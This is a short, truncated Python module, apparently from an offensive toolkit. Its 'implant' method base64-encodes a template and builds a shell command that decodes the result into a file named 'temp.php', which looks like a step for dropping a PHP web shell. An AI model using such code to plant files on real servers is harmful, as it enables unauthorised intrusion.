#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
sys.path.append('..')
from models.engine import Engine
from execute import execute_command

class Auxiliary(object):
    def __init__(self, template):
        self._template = template
    
    def implant(self, dic):
        content = Engine(self._template).base64(dic)
        cmd = "echo {} | base64 -d > {}".format(content, "temp.php")
        